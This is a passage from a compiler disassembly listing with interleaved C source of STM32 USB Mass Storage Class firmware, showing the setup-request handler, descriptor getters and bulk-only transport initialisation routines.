            ret = USBD_FAIL;
          }
          break;
 8008f54:	e025      	b.n	8008fa2 <USBD_MSC_Setup+0xde>
            USBD_CtlError(pdev, req);
 8008f56:	6839      	ldr	r1, [r7, #0]
 8008f58:	6878      	ldr	r0, [r7, #4]
 8008f5a:	f003 f902 	bl	800c162 <USBD_CtlError>
            ret = USBD_FAIL;
 8008f5e:	2303      	movs	r3, #3
 8008f60:	75fb      	strb	r3, [r7, #23]
          break;
 8008f62:	e01e      	b.n	8008fa2 <USBD_MSC_Setup+0xde>

        case BOT_RESET :
          if ((req->wValue  == 0U) && (req->wLength == 0U) &&
 8008f64:	683b      	ldr	r3, [r7, #0]
 8008f66:	885b      	ldrh	r3, [r3, #2]
 8008f68:	2b00      	cmp	r3, #0
 8008f6a:	d10c      	bne.n	8008f86 <USBD_MSC_Setup+0xc2>
 8008f6c:	683b      	ldr	r3, [r7, #0]
 8008f6e:	88db      	ldrh	r3, [r3, #6]
 8008f70:	2b00      	cmp	r3, #0
 8008f72:	d108      	bne.n	8008f86 <USBD_MSC_Setup+0xc2>
              ((req->bmRequest & 0x80U) != 0x80U))
 8008f74:	683b      	ldr	r3, [r7, #0]
 8008f76:	781b      	ldrb	r3, [r3, #0]
 8008f78:	b25b      	sxtb	r3, r3
          if ((req->wValue  == 0U) && (req->wLength == 0U) &&
 8008f7a:	2b00      	cmp	r3, #0
 8008f7c:	db03      	blt.n	8008f86 <USBD_MSC_Setup+0xc2>
          {
            MSC_BOT_Reset(pdev);
 8008f7e:	6878      	ldr	r0, [r7, #4]
 8008f80:	f000 f9bc 	bl	80092fc <MSC_BOT_Reset>
          else
          {
            USBD_CtlError(pdev, req);
            ret = USBD_FAIL;
          }
          break;
 8008f84:	e00d      	b.n	8008fa2 <USBD_MSC_Setup+0xde>
            USBD_CtlError(pdev, req);
 8008f86:	6839      	ldr	r1, [r7, #0]
 8008f88:	6878      	ldr	r0, [r7, #4]
 8008f8a:	f003 f8ea 	bl	800c162 <USBD_CtlError>
            ret = USBD_FAIL;
 8008f8e:	2303      	movs	r3, #3
 8008f90:	75fb      	strb	r3, [r7, #23]
          break;
 8008f92:	e006      	b.n	8008fa2 <USBD_MSC_Setup+0xde>

        default:
          USBD_CtlError(pdev, req);
 8008f94:	6839      	ldr	r1, [r7, #0]
 8008f96:	6878      	ldr	r0, [r7, #4]
 8008f98:	f003 f8e3 	bl	800c162 <USBD_CtlError>
          ret = USBD_FAIL;
 8008f9c:	2303      	movs	r3, #3
 8008f9e:	75fb      	strb	r3, [r7, #23]
          break;
 8008fa0:	bf00      	nop
      }
      break;
 8008fa2:	e086      	b.n	80090b2 <USBD_MSC_Setup+0x1ee>
    /* Interface & Endpoint request */
    case USB_REQ_TYPE_STANDARD:
      switch (req->bRequest)
 8008fa4:	683b      	ldr	r3, [r7, #0]
 8008fa6:	785b      	ldrb	r3, [r3, #1]
 8008fa8:	2b0b      	cmp	r3, #11
 8008faa:	d872      	bhi.n	8009092 <USBD_MSC_Setup+0x1ce>
 8008fac:	a201      	add	r2, pc, #4	; (adr r2, 8008fb4 <USBD_MSC_Setup+0xf0>)
 8008fae:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 8008fb2:	bf00      	nop
 8008fb4:	08008fe5 	.word	0x08008fe5
 8008fb8:	08009061 	.word	0x08009061
 8008fbc:	08009093 	.word	0x08009093
 8008fc0:	08009093 	.word	0x08009093
 8008fc4:	08009093 	.word	0x08009093
 8008fc8:	08009093 	.word	0x08009093
 8008fcc:	08009093 	.word	0x08009093
 8008fd0:	08009093 	.word	0x08009093
 8008fd4:	08009093 	.word	0x08009093
 8008fd8:	08009093 	.word	0x08009093
 8008fdc:	0800900f 	.word	0x0800900f
 8008fe0:	08009039 	.word	0x08009039
      {
        case USB_REQ_GET_STATUS:
          if (pdev->dev_state == USBD_STATE_CONFIGURED)
 8008fe4:	687b      	ldr	r3, [r7, #4]
 8008fe6:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 8008fea:	b2db      	uxtb	r3, r3
 8008fec:	2b03      	cmp	r3, #3
 8008fee:	d107      	bne.n	8009000 <USBD_MSC_Setup+0x13c>
          {
            (void)USBD_CtlSendData(pdev, (uint8_t *)&status_info, 2U);
 8008ff0:	f107 030e 	add.w	r3, r7, #14
 8008ff4:	2202      	movs	r2, #2
 8008ff6:	4619      	mov	r1, r3
 8008ff8:	6878      	ldr	r0, [r7, #4]
 8008ffa:	f003 f923 	bl	800c244 <USBD_CtlSendData>
          else
          {
            USBD_CtlError(pdev, req);
            ret = USBD_FAIL;
          }
          break;
 8008ffe:	e050      	b.n	80090a2 <USBD_MSC_Setup+0x1de>
            USBD_CtlError(pdev, req);
 8009000:	6839      	ldr	r1, [r7, #0]
 8009002:	6878      	ldr	r0, [r7, #4]
 8009004:	f003 f8ad 	bl	800c162 <USBD_CtlError>
            ret = USBD_FAIL;
 8009008:	2303      	movs	r3, #3
 800900a:	75fb      	strb	r3, [r7, #23]
          break;
 800900c:	e049      	b.n	80090a2 <USBD_MSC_Setup+0x1de>

        case USB_REQ_GET_INTERFACE:
          if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800900e:	687b      	ldr	r3, [r7, #4]
 8009010:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 8009014:	b2db      	uxtb	r3, r3
 8009016:	2b03      	cmp	r3, #3
 8009018:	d107      	bne.n	800902a <USBD_MSC_Setup+0x166>
          {
            (void)USBD_CtlSendData(pdev, (uint8_t *)&hmsc->interface, 1U);
 800901a:	693b      	ldr	r3, [r7, #16]
 800901c:	3304      	adds	r3, #4
 800901e:	2201      	movs	r2, #1
 8009020:	4619      	mov	r1, r3
 8009022:	6878      	ldr	r0, [r7, #4]
 8009024:	f003 f90e 	bl	800c244 <USBD_CtlSendData>
          else
          {
            USBD_CtlError(pdev, req);
            ret = USBD_FAIL;
          }
          break;
 8009028:	e03b      	b.n	80090a2 <USBD_MSC_Setup+0x1de>
            USBD_CtlError(pdev, req);
 800902a:	6839      	ldr	r1, [r7, #0]
 800902c:	6878      	ldr	r0, [r7, #4]
 800902e:	f003 f898 	bl	800c162 <USBD_CtlError>
            ret = USBD_FAIL;
 8009032:	2303      	movs	r3, #3
 8009034:	75fb      	strb	r3, [r7, #23]
          break;
 8009036:	e034      	b.n	80090a2 <USBD_MSC_Setup+0x1de>

        case USB_REQ_SET_INTERFACE:
          if (pdev->dev_state == USBD_STATE_CONFIGURED)
 8009038:	687b      	ldr	r3, [r7, #4]
 800903a:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800903e:	b2db      	uxtb	r3, r3
 8009040:	2b03      	cmp	r3, #3
 8009042:	d106      	bne.n	8009052 <USBD_MSC_Setup+0x18e>
          {
            hmsc->interface = (uint8_t)(req->wValue);
 8009044:	683b      	ldr	r3, [r7, #0]
 8009046:	885b      	ldrh	r3, [r3, #2]
 8009048:	b2db      	uxtb	r3, r3
 800904a:	461a      	mov	r2, r3
 800904c:	693b      	ldr	r3, [r7, #16]
 800904e:	605a      	str	r2, [r3, #4]
          else
          {
            USBD_CtlError(pdev, req);
            ret = USBD_FAIL;
          }
          break;
 8009050:	e027      	b.n	80090a2 <USBD_MSC_Setup+0x1de>
            USBD_CtlError(pdev, req);
 8009052:	6839      	ldr	r1, [r7, #0]
 8009054:	6878      	ldr	r0, [r7, #4]
 8009056:	f003 f884 	bl	800c162 <USBD_CtlError>
            ret = USBD_FAIL;
 800905a:	2303      	movs	r3, #3
 800905c:	75fb      	strb	r3, [r7, #23]
          break;
 800905e:	e020      	b.n	80090a2 <USBD_MSC_Setup+0x1de>

        case USB_REQ_CLEAR_FEATURE:
          if (pdev->dev_state == USBD_STATE_CONFIGURED)
 8009060:	687b      	ldr	r3, [r7, #4]
 8009062:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 8009066:	b2db      	uxtb	r3, r3
 8009068:	2b03      	cmp	r3, #3
 800906a:	d119      	bne.n	80090a0 <USBD_MSC_Setup+0x1dc>
          {
            if (req->wValue == USB_FEATURE_EP_HALT)
 800906c:	683b      	ldr	r3, [r7, #0]
 800906e:	885b      	ldrh	r3, [r3, #2]
 8009070:	2b00      	cmp	r3, #0
 8009072:	d115      	bne.n	80090a0 <USBD_MSC_Setup+0x1dc>
            {
              /* Flush the FIFO */
              (void)USBD_LL_FlushEP(pdev, (uint8_t)req->wIndex);
 8009074:	683b      	ldr	r3, [r7, #0]
 8009076:	889b      	ldrh	r3, [r3, #4]
 8009078:	b2db      	uxtb	r3, r3
 800907a:	4619      	mov	r1, r3
 800907c:	6878      	ldr	r0, [r7, #4]
 800907e:	f003 fdad 	bl	800cbdc <USBD_LL_FlushEP>

              /* Handle BOT error */
              MSC_BOT_CplClrFeature(pdev, (uint8_t)req->wIndex);
 8009082:	683b      	ldr	r3, [r7, #0]
 8009084:	889b      	ldrh	r3, [r3, #4]
 8009086:	b2db      	uxtb	r3, r3
 8009088:	4619      	mov	r1, r3
 800908a:	6878      	ldr	r0, [r7, #4]
 800908c:	f000 fb54 	bl	8009738 <MSC_BOT_CplClrFeature>
            }
          }
          break;
 8009090:	e006      	b.n	80090a0 <USBD_MSC_Setup+0x1dc>

        default:
          USBD_CtlError(pdev, req);
 8009092:	6839      	ldr	r1, [r7, #0]
 8009094:	6878      	ldr	r0, [r7, #4]
 8009096:	f003 f864 	bl	800c162 <USBD_CtlError>
          ret = USBD_FAIL;
 800909a:	2303      	movs	r3, #3
 800909c:	75fb      	strb	r3, [r7, #23]
          break;
 800909e:	e000      	b.n	80090a2 <USBD_MSC_Setup+0x1de>
          break;
 80090a0:	bf00      	nop
      }
      break;
 80090a2:	e006      	b.n	80090b2 <USBD_MSC_Setup+0x1ee>

    default:
      USBD_CtlError(pdev, req);
 80090a4:	6839      	ldr	r1, [r7, #0]
 80090a6:	6878      	ldr	r0, [r7, #4]
 80090a8:	f003 f85b 	bl	800c162 <USBD_CtlError>
      ret = USBD_FAIL;
 80090ac:	2303      	movs	r3, #3
 80090ae:	75fb      	strb	r3, [r7, #23]
      break;
 80090b0:	bf00      	nop
  }

  return (uint8_t)ret;
 80090b2:	7dfb      	ldrb	r3, [r7, #23]
}
 80090b4:	4618      	mov	r0, r3
 80090b6:	3718      	adds	r7, #24
 80090b8:	46bd      	mov	sp, r7
 80090ba:	bd80      	pop	{r7, pc}

080090bc <USBD_MSC_DataIn>:
  * @param  pdev: device instance
  * @param  epnum: endpoint index
  * @retval status
  */
uint8_t USBD_MSC_DataIn(USBD_HandleTypeDef *pdev, uint8_t epnum)
{
 80090bc:	b580      	push	{r7, lr}
 80090be:	b082      	sub	sp, #8
 80090c0:	af00      	add	r7, sp, #0
 80090c2:	6078      	str	r0, [r7, #4]
 80090c4:	460b      	mov	r3, r1
 80090c6:	70fb      	strb	r3, [r7, #3]
  MSC_BOT_DataIn(pdev, epnum);
 80090c8:	78fb      	ldrb	r3, [r7, #3]
 80090ca:	4619      	mov	r1, r3
 80090cc:	6878      	ldr	r0, [r7, #4]
 80090ce:	f000 f961 	bl	8009394 <MSC_BOT_DataIn>

  return (uint8_t)USBD_OK;
 80090d2:	2300      	movs	r3, #0
}
 80090d4:	4618      	mov	r0, r3
 80090d6:	3708      	adds	r7, #8
 80090d8:	46bd      	mov	sp, r7
 80090da:	bd80      	pop	{r7, pc}

080090dc <USBD_MSC_DataOut>:
  * @param  pdev: device instance
  * @param  epnum: endpoint index
  * @retval status
  */
uint8_t USBD_MSC_DataOut(USBD_HandleTypeDef *pdev, uint8_t epnum)
{
 80090dc:	b580      	push	{r7, lr}
 80090de:	b082      	sub	sp, #8
 80090e0:	af00      	add	r7, sp, #0
 80090e2:	6078      	str	r0, [r7, #4]
 80090e4:	460b      	mov	r3, r1
 80090e6:	70fb      	strb	r3, [r7, #3]
  MSC_BOT_DataOut(pdev, epnum);
 80090e8:	78fb      	ldrb	r3, [r7, #3]
 80090ea:	4619      	mov	r1, r3
 80090ec:	6878      	ldr	r0, [r7, #4]
 80090ee:	f000 f98d 	bl	800940c <MSC_BOT_DataOut>

  return (uint8_t)USBD_OK;
 80090f2:	2300      	movs	r3, #0
}
 80090f4:	4618      	mov	r0, r3
 80090f6:	3708      	adds	r7, #8
 80090f8:	46bd      	mov	sp, r7
 80090fa:	bd80      	pop	{r7, pc}

080090fc <USBD_MSC_GetHSCfgDesc>:
  *         return configuration descriptor
  * @param  length : pointer data length
  * @retval pointer to descriptor buffer
  */
uint8_t *USBD_MSC_GetHSCfgDesc(uint16_t *length)
{
 80090fc:	b580      	push	{r7, lr}
 80090fe:	b084      	sub	sp, #16
 8009100:	af00      	add	r7, sp, #0
 8009102:	6078      	str	r0, [r7, #4]
  USBD_EpDescTypeDef *pEpInDesc = USBD_GetEpDesc(USBD_MSC_CfgDesc, MSC_EPIN_ADDR);
 8009104:	2181      	movs	r1, #129	; 0x81
 8009106:	4812      	ldr	r0, [pc, #72]	; (8009150 <USBD_MSC_GetHSCfgDesc+0x54>)
 8009108:	f002 f9c8 	bl	800b49c <USBD_GetEpDesc>
 800910c:	60f8      	str	r0, [r7, #12]
  USBD_EpDescTypeDef *pEpOutDesc = USBD_GetEpDesc(USBD_MSC_CfgDesc, MSC_EPOUT_ADDR);
 800910e:	2101      	movs	r1, #1
 8009110:	480f      	ldr	r0, [pc, #60]	; (8009150 <USBD_MSC_GetHSCfgDesc+0x54>)
 8009112:	f002 f9c3 	bl	800b49c <USBD_GetEpDesc>
 8009116:	60b8      	str	r0, [r7, #8]

  if (pEpInDesc != NULL)
 8009118:	68fb      	ldr	r3, [r7, #12]
 800911a:	2b00      	cmp	r3, #0
 800911c:	d006      	beq.n	800912c <USBD_MSC_GetHSCfgDesc+0x30>
  {
    pEpInDesc->wMaxPacketSize = MSC_MAX_HS_PACKET;
 800911e:	68fb      	ldr	r3, [r7, #12]
 8009120:	2200      	movs	r2, #0
 8009122:	711a      	strb	r2, [r3, #4]
 8009124:	2200      	movs	r2, #0
 8009126:	f042 0202 	orr.w	r2, r2, #2
 800912a:	715a      	strb	r2, [r3, #5]
  }

  if (pEpOutDesc != NULL)
 800912c:	68bb      	ldr	r3, [r7, #8]
 800912e:	2b00      	cmp	r3, #0
 8009130:	d006      	beq.n	8009140 <USBD_MSC_GetHSCfgDesc+0x44>
  {
    pEpOutDesc->wMaxPacketSize = MSC_MAX_HS_PACKET;
 8009132:	68bb      	ldr	r3, [r7, #8]
 8009134:	2200      	movs	r2, #0
 8009136:	711a      	strb	r2, [r3, #4]
 8009138:	2200      	movs	r2, #0
 800913a:	f042 0202 	orr.w	r2, r2, #2
 800913e:	715a      	strb	r2, [r3, #5]
  }

  *length = (uint16_t)sizeof(USBD_MSC_CfgDesc);
 8009140:	687b      	ldr	r3, [r7, #4]
 8009142:	2220      	movs	r2, #32
 8009144:	801a      	strh	r2, [r3, #0]
  return USBD_MSC_CfgDesc;
 8009146:	4b02      	ldr	r3, [pc, #8]	; (8009150 <USBD_MSC_GetHSCfgDesc+0x54>)
}
 8009148:	4618      	mov	r0, r3
 800914a:	3710      	adds	r7, #16
 800914c:	46bd      	mov	sp, r7
 800914e:	bd80      	pop	{r7, pc}
 8009150:	200000e0 	.word	0x200000e0

08009154 <USBD_MSC_GetFSCfgDesc>:
  *         return configuration descriptor
  * @param  length : pointer data length
  * @retval pointer to descriptor buffer
  */
uint8_t *USBD_MSC_GetFSCfgDesc(uint16_t *length)
{
 8009154:	b580      	push	{r7, lr}
 8009156:	b084      	sub	sp, #16
 8009158:	af00      	add	r7, sp, #0
 800915a:	6078      	str	r0, [r7, #4]
  USBD_EpDescTypeDef *pEpInDesc = USBD_GetEpDesc(USBD_MSC_CfgDesc, MSC_EPIN_ADDR);
 800915c:	2181      	movs	r1, #129	; 0x81
 800915e:	4812      	ldr	r0, [pc, #72]	; (80091a8 <USBD_MSC_GetFSCfgDesc+0x54>)
 8009160:	f002 f99c 	bl	800b49c <USBD_GetEpDesc>
 8009164:	60f8      	str	r0, [r7, #12]
  USBD_EpDescTypeDef *pEpOutDesc = USBD_GetEpDesc(USBD_MSC_CfgDesc, MSC_EPOUT_ADDR);
 8009166:	2101      	movs	r1, #1
 8009168:	480f      	ldr	r0, [pc, #60]	; (80091a8 <USBD_MSC_GetFSCfgDesc+0x54>)
 800916a:	f002 f997 	bl	800b49c <USBD_GetEpDesc>
 800916e:	60b8      	str	r0, [r7, #8]

  if (pEpInDesc != NULL)
 8009170:	68fb      	ldr	r3, [r7, #12]
 8009172:	2b00      	cmp	r3, #0
 8009174:	d006      	beq.n	8009184 <USBD_MSC_GetFSCfgDesc+0x30>
  {
    pEpInDesc->wMaxPacketSize = MSC_MAX_FS_PACKET;
 8009176:	68fb      	ldr	r3, [r7, #12]
 8009178:	2200      	movs	r2, #0
 800917a:	f042 0240 	orr.w	r2, r2, #64	; 0x40
 800917e:	711a      	strb	r2, [r3, #4]
 8009180:	2200      	movs	r2, #0
 8009182:	715a      	strb	r2, [r3, #5]
  }

  if (pEpOutDesc != NULL)
 8009184:	68bb      	ldr	r3, [r7, #8]
 8009186:	2b00      	cmp	r3, #0
 8009188:	d006      	beq.n	8009198 <USBD_MSC_GetFSCfgDesc+0x44>
  {
    pEpOutDesc->wMaxPacketSize = MSC_MAX_FS_PACKET;
 800918a:	68bb      	ldr	r3, [r7, #8]
 800918c:	2200      	movs	r2, #0
 800918e:	f042 0240 	orr.w	r2, r2, #64	; 0x40
 8009192:	711a      	strb	r2, [r3, #4]
 8009194:	2200      	movs	r2, #0
 8009196:	715a      	strb	r2, [r3, #5]
  }

  *length = (uint16_t)sizeof(USBD_MSC_CfgDesc);
 8009198:	687b      	ldr	r3, [r7, #4]
 800919a:	2220      	movs	r2, #32
 800919c:	801a      	strh	r2, [r3, #0]
  return USBD_MSC_CfgDesc;
 800919e:	4b02      	ldr	r3, [pc, #8]	; (80091a8 <USBD_MSC_GetFSCfgDesc+0x54>)
}
 80091a0:	4618      	mov	r0, r3
 80091a2:	3710      	adds	r7, #16
 80091a4:	46bd      	mov	sp, r7
 80091a6:	bd80      	pop	{r7, pc}
 80091a8:	200000e0 	.word	0x200000e0

080091ac <USBD_MSC_GetOtherSpeedCfgDesc>:
  *         return other speed configuration descriptor
  * @param  length : pointer data length
  * @retval pointer to descriptor buffer
  */
uint8_t *USBD_MSC_GetOtherSpeedCfgDesc(uint16_t *length)
{
 80091ac:	b580      	push	{r7, lr}
 80091ae:	b084      	sub	sp, #16
 80091b0:	af00      	add	r7, sp, #0
 80091b2:	6078      	str	r0, [r7, #4]
  USBD_EpDescTypeDef *pEpInDesc = USBD_GetEpDesc(USBD_MSC_CfgDesc, MSC_EPIN_ADDR);
 80091b4:	2181      	movs	r1, #129	; 0x81
 80091b6:	4812      	ldr	r0, [pc, #72]	; (8009200 <USBD_MSC_GetOtherSpeedCfgDesc+0x54>)
 80091b8:	f002 f970 	bl	800b49c <USBD_GetEpDesc>
 80091bc:	60f8      	str	r0, [r7, #12]
  USBD_EpDescTypeDef *pEpOutDesc = USBD_GetEpDesc(USBD_MSC_CfgDesc, MSC_EPOUT_ADDR);
 80091be:	2101      	movs	r1, #1
 80091c0:	480f      	ldr	r0, [pc, #60]	; (8009200 <USBD_MSC_GetOtherSpeedCfgDesc+0x54>)
 80091c2:	f002 f96b 	bl	800b49c <USBD_GetEpDesc>
 80091c6:	60b8      	str	r0, [r7, #8]

  if (pEpInDesc != NULL)
 80091c8:	68fb      	ldr	r3, [r7, #12]
 80091ca:	2b00      	cmp	r3, #0
 80091cc:	d006      	beq.n	80091dc <USBD_MSC_GetOtherSpeedCfgDesc+0x30>
  {
    pEpInDesc->wMaxPacketSize = MSC_MAX_FS_PACKET;
 80091ce:	68fb      	ldr	r3, [r7, #12]
 80091d0:	2200      	movs	r2, #0
 80091d2:	f042 0240 	orr.w	r2, r2, #64	; 0x40
 80091d6:	711a      	strb	r2, [r3, #4]
 80091d8:	2200      	movs	r2, #0
 80091da:	715a      	strb	r2, [r3, #5]
  }

  if (pEpOutDesc != NULL)
 80091dc:	68bb      	ldr	r3, [r7, #8]
 80091de:	2b00      	cmp	r3, #0
 80091e0:	d006      	beq.n	80091f0 <USBD_MSC_GetOtherSpeedCfgDesc+0x44>
  {
    pEpOutDesc->wMaxPacketSize = MSC_MAX_FS_PACKET;
 80091e2:	68bb      	ldr	r3, [r7, #8]
 80091e4:	2200      	movs	r2, #0
 80091e6:	f042 0240 	orr.w	r2, r2, #64	; 0x40
 80091ea:	711a      	strb	r2, [r3, #4]
 80091ec:	2200      	movs	r2, #0
 80091ee:	715a      	strb	r2, [r3, #5]
  }

  *length = (uint16_t)sizeof(USBD_MSC_CfgDesc);
 80091f0:	687b      	ldr	r3, [r7, #4]
 80091f2:	2220      	movs	r2, #32
 80091f4:	801a      	strh	r2, [r3, #0]
  return USBD_MSC_CfgDesc;
 80091f6:	4b02      	ldr	r3, [pc, #8]	; (8009200 <USBD_MSC_GetOtherSpeedCfgDesc+0x54>)
}
 80091f8:	4618      	mov	r0, r3
 80091fa:	3710      	adds	r7, #16
 80091fc:	46bd      	mov	sp, r7
 80091fe:	bd80      	pop	{r7, pc}
 8009200:	200000e0 	.word	0x200000e0

08009204 <USBD_MSC_GetDeviceQualifierDescriptor>:
  *         return Device Qualifier descriptor
  * @param  length : pointer data length
  * @retval pointer to descriptor buffer
  */
uint8_t *USBD_MSC_GetDeviceQualifierDescriptor(uint16_t *length)
{
 8009204:	b480      	push	{r7}
 8009206:	b083      	sub	sp, #12
 8009208:	af00      	add	r7, sp, #0
 800920a:	6078      	str	r0, [r7, #4]
  *length = (uint16_t)sizeof(USBD_MSC_DeviceQualifierDesc);
 800920c:	687b      	ldr	r3, [r7, #4]
 800920e:	220a      	movs	r2, #10
 8009210:	801a      	strh	r2, [r3, #0]

  return USBD_MSC_DeviceQualifierDesc;
 8009212:	4b03      	ldr	r3, [pc, #12]	; (8009220 <USBD_MSC_GetDeviceQualifierDescriptor+0x1c>)
}
 8009214:	4618      	mov	r0, r3
 8009216:	370c      	adds	r7, #12
 8009218:	46bd      	mov	sp, r7
 800921a:	f85d 7b04 	ldr.w	r7, [sp], #4
 800921e:	4770      	bx	lr
 8009220:	20000100 	.word	0x20000100

08009224 <USBD_MSC_RegisterStorage>:
  * @brief  USBD_MSC_RegisterStorage
  * @param  fops: storage callback
  * @retval status
  */
uint8_t USBD_MSC_RegisterStorage(USBD_HandleTypeDef *pdev, USBD_StorageTypeDef *fops)
{
 8009224:	b480      	push	{r7}
 8009226:	b083      	sub	sp, #12
 8009228:	af00      	add	r7, sp, #0
 800922a:	6078      	str	r0, [r7, #4]
 800922c:	6039      	str	r1, [r7, #0]
  if (fops == NULL)
 800922e:	683b      	ldr	r3, [r7, #0]
 8009230:	2b00      	cmp	r3, #0
 8009232:	d101      	bne.n	8009238 <USBD_MSC_RegisterStorage+0x14>
  {
    return (uint8_t)USBD_FAIL;
 8009234:	2303      	movs	r3, #3
 8009236:	e009      	b.n	800924c <USBD_MSC_RegisterStorage+0x28>
  }

  pdev->pUserData[pdev->classId] = fops;
 8009238:	687b      	ldr	r3, [r7, #4]
 800923a:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 800923e:	687a      	ldr	r2, [r7, #4]
 8009240:	33b0      	adds	r3, #176	; 0xb0
 8009242:	009b      	lsls	r3, r3, #2
 8009244:	4413      	add	r3, r2
 8009246:	683a      	ldr	r2, [r7, #0]
 8009248:	605a      	str	r2, [r3, #4]

  return (uint8_t)USBD_OK;
 800924a:	2300      	movs	r3, #0
}
 800924c:	4618      	mov	r0, r3
 800924e:	370c      	adds	r7, #12
 8009250:	46bd      	mov	sp, r7
 8009252:	f85d 7b04 	ldr.w	r7, [sp], #4
 8009256:	4770      	bx	lr

08009258 <MSC_BOT_Init>:
  *         Initialize the BOT Process
  * @param  pdev: device instance
  * @retval None
  */
void MSC_BOT_Init(USBD_HandleTypeDef *pdev)
{
 8009258:	b580      	push	{r7, lr}
 800925a:	b084      	sub	sp, #16
 800925c:	af00      	add	r7, sp, #0
 800925e:	6078      	str	r0, [r7, #4]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009260:	687b      	ldr	r3, [r7, #4]
 8009262:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8009266:	687b      	ldr	r3, [r7, #4]
 8009268:	32b0      	adds	r2, #176	; 0xb0
 800926a:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800926e:	60fb      	str	r3, [r7, #12]
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc == NULL)
 8009270:	68fb      	ldr	r3, [r7, #12]
 8009272:	2b00      	cmp	r3, #0
 8009274:	d039      	beq.n	80092ea <MSC_BOT_Init+0x92>
  {
    return;
  }

  hmsc->bot_state = USBD_BOT_IDLE;
 8009276:	68fb      	ldr	r3, [r7, #12]
 8009278:	2200      	movs	r2, #0
 800927a:	721a      	strb	r2, [r3, #8]
  hmsc->bot_status = USBD_BOT_STATUS_NORMAL;
 800927c:	68fb      	ldr	r3, [r7, #12]
 800927e:	2200      	movs	r2, #0
 8009280:	725a      	strb	r2, [r3, #9]

  hmsc->scsi_sense_tail = 0U;
 8009282:	68fb      	ldr	r3, [r7, #12]
 8009284:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009288:	2200      	movs	r2, #0
 800928a:	f883 2061 	strb.w	r2, [r3, #97]	; 0x61
  hmsc->scsi_sense_head = 0U;
 800928e:	68fb      	ldr	r3, [r7, #12]
 8009290:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009294:	2200      	movs	r2, #0
 8009296:	f883 2060 	strb.w	r2, [r3, #96]	; 0x60
  hmsc->scsi_medium_state = SCSI_MEDIUM_UNLOCKED;
 800929a:	68fb      	ldr	r3, [r7, #12]
 800929c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 80092a0:	2200      	movs	r2, #0
 80092a2:	f883 2062 	strb.w	r2, [r3, #98]	; 0x62

  ((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->Init(0U);
 80092a6:	687b      	ldr	r3, [r7, #4]
 80092a8:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 80092ac:	687a      	ldr	r2, [r7, #4]
 80092ae:	33b0      	adds	r3, #176	; 0xb0
 80092b0:	009b      	lsls	r3, r3, #2
 80092b2:	4413      	add	r3, r2
 80092b4:	685b      	ldr	r3, [r3, #4]
 80092b6:	681b      	ldr	r3, [r3, #0]
 80092b8:	2000      	movs	r0, #0
 80092ba:	4798      	blx	r3

  (void)USBD_LL_FlushEP(pdev, MSCOutEpAdd);
 80092bc:	4b0d      	ldr	r3, [pc, #52]	; (80092f4 <MSC_BOT_Init+0x9c>)
 80092be:	781b      	ldrb	r3, [r3, #0]
 80092c0:	4619      	mov	r1, r3
 80092c2:	6878      	ldr	r0, [r7, #4]
 80092c4:	f003 fc8a 	bl	800cbdc <USBD_LL_FlushEP>
  (void)USBD_LL_FlushEP(pdev, MSCInEpAdd);
 80092c8:	4b0b      	ldr	r3, [pc, #44]	; (80092f8 <MSC_BOT_Init+0xa0>)
 80092ca:	781b      	ldrb	r3, [r3, #0]
 80092cc:	4619      	mov	r1, r3
 80092ce:	6878      	ldr	r0, [r7, #4]
 80092d0:	f003 fc84 	bl	800cbdc <USBD_LL_FlushEP>

  /* Prepare EP to Receive First BOT Cmd */
  (void)USBD_LL_PrepareReceive(pdev, MSCOutEpAdd, (uint8_t *)&hmsc->cbw,
 80092d4:	4b07      	ldr	r3, [pc, #28]	; (80092f4 <MSC_BOT_Init+0x9c>)
 80092d6:	7819      	ldrb	r1, [r3, #0]
 80092d8:	68fb      	ldr	r3, [r7, #12]
 80092da:	f503 5280 	add.w	r2, r3, #4096	; 0x1000
 80092de:	3210      	adds	r2, #16
 80092e0:	231f      	movs	r3, #31
 80092e2:	6878      	ldr	r0, [r7, #4]
 80092e4:	f003 fdb8 	bl	800ce58 <USBD_LL_PrepareReceive>
 80092e8:	e000      	b.n	80092ec <MSC_BOT_Init+0x94>
    return;
 80092ea:	bf00      	nop
                               USBD_BOT_CBW_LENGTH);
}
 80092ec:	3710      	adds	r7, #16
 80092ee:	46bd      	mov	sp, r7
 80092f0:	bd80      	pop	{r7, pc}
 80092f2:	bf00      	nop
 80092f4:	2000010b 	.word	0x2000010b
 80092f8:	2000010a 	.word	0x2000010a

080092fc <MSC_BOT_Reset>:
  *         Reset the BOT Machine
  * @param  pdev: device instance
  * @retval  None
  */
void MSC_BOT_Reset(USBD_HandleTypeDef *pdev)
{
 80092fc:	b580      	push	{r7, lr}
 80092fe:	b084      	sub	sp, #16
 8009300:	af00      	add	r7, sp, #0
 8009302:	6078      	str	r0, [r7, #4]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009304:	687b      	ldr	r3, [r7, #4]
 8009306:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800930a:	687b      	ldr	r3, [r7, #4]
 800930c:	32b0      	adds	r2, #176	; 0xb0
 800930e:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8009312:	60fb      	str	r3, [r7, #12]
  /* Get the Endpoints addresses allocated for this class instance */
